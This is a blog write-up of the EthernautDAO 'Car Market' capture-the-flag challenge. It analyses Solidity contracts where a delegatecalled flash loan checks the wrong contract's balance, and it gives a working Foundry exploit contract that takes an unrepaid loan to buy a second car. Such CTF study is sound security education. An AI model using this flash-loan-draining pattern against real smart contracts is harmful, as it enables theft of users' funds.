---
title: 'EthernautDAO CTF — Car Market Solution'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>The goal for this challenge is to be able to **mint and owns** two different cars. This mean that we need to find a way to gather `100_000 Token` to purchase the second car.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-07-20T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1548995357194874885](https://twitter.com/EthernautDAO/status/1548995357194874885)

# CTF 3: Car Market

For this challenge, we have three different smart contracts to review:

[CarToken](https://goerli.etherscan.io/address/0x66408824a99ff61ae2e032e3c7a461ded1a6718e#code): An ERC20 token to purchase Cars

> This is the implementation of the CarToken contract
> There is a capped supply of 210,000 tokens.
> 10,000 tokens is reserved for the public
> User can only mint once

[CarMarket](https://goerli.etherscan.io/address/0x07abfcced19aeb5148c284cd39a9ff2ac835960a#code): A Car marketplace where you can purchase Cars for CarToken

> CarMarket is a marketplace where people interested in cars can buy directly from the company.
> To grow her userbase, the company allows first time users to purchase cars for free.
> Getting a free car involves, using the company's tokens which is given to first timers for free.
> There is a problem however, malicious users have discovered how to get a second car for free.
> Your job is to figure out how to purchase a second car in a clever and ingenious way.

[CarFactory](https://goerli.etherscan.io/address/0x012f0c715725683a5405b596f4f55d4ad3046854#code): A contract that gives out flashloan to existing customers of the Car Company

> This is a contract that handles crucial changes in the car company.
> It also gives out flashloans to existing customers of the car company.

At deployment time:

- `CarMarket` owns `100_000` Car tokens
- `CarFactory` owns `100_000` Car tokens
- `CarToken` contracts allow each user to mint `1 Token` for free (free mint)
- The first purchase for each user will cost `1 Token`
- After the first purchase, each Car will cost `100_000 Token`
- We start with `0 Token` in our balance

The goal for this challenge is to be able to **mint and owns** two different cars. This mean that we need to find a way to gather `100_000 Token` to purchase the second car.

## Study the contracts

Let's start reviewing all the contracts code.

### `CarToken`

This contract is a standard ERC20 token with a max supply of `210_000` tokens.
After deployment

- 100k will be sent to the `CarMarket` contract via `priviledgedMint`
- 100k will be sent to the `CarFactory` contract `priviledgedMint`
- 10k tokens will be available to be minted from end users via the `mint`

`priviledgedMint` allow the owner of the contract to mint `_amount` of tokens and send them to `_to` address. The function correctly check that only the `owner` can mint, and that minting `_amount` will not go over the total supply of the token.

`mint` allow the user to mint only once `1 token`

### `CarMarket`

This contract allows the users to purchase new cars. The cost of each car will be of `1 Token` if it's the first purchase; otherwise it will cost `100_000 Token`.

Let's review each function

- `_carCost` is a private utility function that return the Car price. If it's the first purchase (`carCount[_buyer]`) it will return `1 token` otherwise it will return `100_000 token`
- `purchaseCar` is the function that allow the user to purchase the Car. It checks that the user has more or equal CarToken balance compared to the cost of the car (see `_carCost`). After the check, it transfers the tokens from the CarToken contract to the `owner` of the `CarMarket` contract, increase the `carCount` of the user and assign the purchased car to the user via the `purchasedCars` mapping. One thing to note: the function does not respect the **[Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)**, so this function could be prone to reentrancy. This is not the case, but if for example CarToken had been an ERC777 token this could have cause plenty of problems.
- `isExistingCustomer` return `true` if the user has purchased already a car
- other getter function to get the address of `CarFactory`, `CarToken` and the number of car purchased by a user

Then we have the `fallback` function implementation:

```solidity
fallback() external {
    carMarket = ICarMarket(address(this));
    carToken.approve(carFactory, carToken.balanceOf(address(this)));
    (bool success, ) = carFactory.delegatecall(msg.data);
    require(success, "Delegate call failed");
}
```

First thing to remember: **this code must not be used in production, this code MUST not be seen as a best practice, it's just code made for a Solidity challenge!**

The `fallback` function is a "special" Solidity function that is triggered when you call a non-existing function on a contract.
In this case, the `CarMarket` contract will perform these operations:

- approve the `CarFactory` as a `spender` of all the `CarToken` tokens in the `CarMarket` balance
- execute a `delegatecall` on `CarFactory` passing the whole `msg.data` (calldata payload)
- check if the `delegatecall` has been executed correctly, otherwise it will revert

### `CarFactory`

This contract is pretty strange. It seems to be a proxy implementation for `CarMarket` but in reality the only thing that it does is to implement the `flashLoan` function that allow a customer to transfer `_amount` of `CarToken`, use them for something and then pay them back (a pretty normal flashloan operation but without any fee/collateral needed).

Let's review the function's code step by step:

```solidity
function flashLoan(uint256 _amount) external {
    //checks if the address has purchased a car previously.
    require(carMarket.isExistingCustomer(msg.sender), "Not existing customer");

    //fetches the balance of the carFactory before loaning out.
    uint256 balanceBefore = carToken.balanceOf(carFactory);

    //check if there is enough amount in the contract to borrow.
    require(balanceBefore >= _amount, "Amount not available");

    //transfers the amount to be borrowed to the borrower
    carToken.transfer(msg.sender, _amount);

    (bool success, ) = msg.sender.call(abi.encodeWithSignature("receivedCarToken(address)", address(this)));
    require(success, "Call to target failed");

    //fetches the balance of the carFactory after loaning out.
    uint256 balanceAfter = carToken.balanceOf(carFactory);

    //ensures that the Loan has been paid
    require(balanceAfter >= balanceBefore, "Loan not paid in full");
}
```

First thing to remember is that this function will be executed through `CarMarket` via the `fallback` function.

1. it checks that the `msg.sender` is a `CarMarket` customer (you must have purchased at least one car)
2. Store the `carFactory` CarToken balance in `balanceBefore`
3. Check that the `_amount` requested for the loan is less or equal to the balance of token of `CarFactory` (from which you are taking the loan from)
4. Transfer `_amount` of CarToken from the contract to the `msg.sender`
5. Execute the flashloan callback `receivedCarToken` on the `msg.sender` contract
6. Get the new and updated `carFactory` balance of CarToken
7. Check that `balanceAfter` is greater or equal of `balanceBefore`. This check is needed to be sure that after executing the callback, the `msg.sender` has repaid the loan.

You could think that you could execute the flashloan directly (given that `CarFactory` has `100k token` in its balance) on the `CarFactory` address (instead of passing by the `CarMarket` contract) but it will fail because `carToken.balanceOf(carFactory)` will return `0` given the fact that `carFactory` on the `CarFactory` contract is `address(0)`. This mean that the function will revert of the next instruction that check `require(balanceBefore >= _amount, "Amount not available");`.
I mean you could do that but the only way to not make it revert would be to ask a flashloan of `0 tokens`, it would be just a waste of gas :D

### The Problem

After reviewing all the contracts and some functions in detail, have you spotted the problem?

The flashloan flow is like this:

1. We make a low-level call to `CarMarket` to trigger the `CarMarket.fallback` function that will perform execute the `flashLoan` implementation on `CarFactory` via `delegatecall`
2. The function check that there are enough tokens in the `CarFactory` balance
3. Perform the transfer from the contract to the user
4. Execute the `receivedCarToken` callback on the caller
5. Check the `CarFactory` balance to see if the user has correctly paid the loan

The big bug here is that the `flashloan`'s transfer is performed by `CarMarket` (remember that the function is executed via a `delegatecall`) but the function check only `CarFactory` balance.

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/CarFactory.sol";
import "src/CarMarket.sol";
import "src/CarToken.sol";

contract CarMarketTest is BaseTest {
    CarFactory private carFactory;
    CarMarket private carMarket;
    CarToken private carToken;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        carFactory = CarFactory(payable(0x012f0c715725683A5405B596f4F55D4AD3046854));
        carMarket = CarMarket(payable(0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A));
        carToken = CarToken(payable(0x66408824A99FF61ae2e032E3c7a461DED1a6718E));

        vm.label(address(carFactory), "CarFactory");
        vm.label(address(carMarket), "CarMarket");
        vm.label(address(carToken), "CarToken");
    }

    function testTakeOwnership() public {
        address player = users[0];

        vm.prank(player);

        // Deploy the exploit contract
        Exploiter exploiter = new Exploiter(carFactory, carMarket, carToken);

        // Assert that our user has 0 car purchased
        assertEq(carMarket.getCarCount(address(exploiter)), 0);

        // Trigger the exploit!
        exploiter.startAttack();

        // Assert that our user has 2 car purchased (success)
        assertEq(carMarket.getCarCount(address(exploiter)), 2);
    }
}

contract Exploiter {
    CarFactory private carFactory;
    CarMarket private carMarket;
    CarToken private carToken;

    constructor(
        CarFactory _carFactory,
        CarMarket _carMarket,
        CarToken _carToken
    ) {
        carFactory = _carFactory;
        carMarket = _carMarket;
        carToken = _carToken;

        // Approve the carMarket to be able to use all the needed token
        // Usually it would be better to single approve only the amount needed for the purchase
        // So in total it would be 1 token for the first purchase + 100k tokens for the second one
        carToken.approve(address(carMarket), 100_001 ether);
    }

    function startAttack() public {
        // mint free cartoken
        carToken.mint();

        // puchase our first car with the "free" minted token
        carMarket.purchaseCar("blue", "ford mustang", "leet");

        // Trigger the flashloan of 100k tokens
        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashLoan(uint256)", 100_000 ether));
        require(success, "flashloan failed");
    }

    function receivedCarToken(address) external {
        // Purchase a new car with the 100k token we received with the loan
        carMarket.purchaseCar("red", "ferrari", "aloah");

        // in a normal flashloan we would be forced to give back the loan (plus some fee on the loan itself)
        // but in this case because the deployer made the error to check the balance on the wrong contract (not the one that was sending the loan)
        // we do not need to give it back
    }
}
```

Here is the command I have used to run the test: `forge test --match-contract CarMarketTest --fork-url <your_rpc_url> --fork-block-number 7248020 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchemy or Infura.

You can read the full solution of the challenge, opening [CarMarket.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/CarMarketTest.t.sol)

## Further reading

- [OpenZeppelin ERC777](https://docs.openzeppelin.com/contracts/4.x/erc777)
- [Solidity Docs: fallback function](https://docs.soliditylang.org/en/latest/contracts.html#fallback-function)
- [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [Solidity Docs: Use the Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
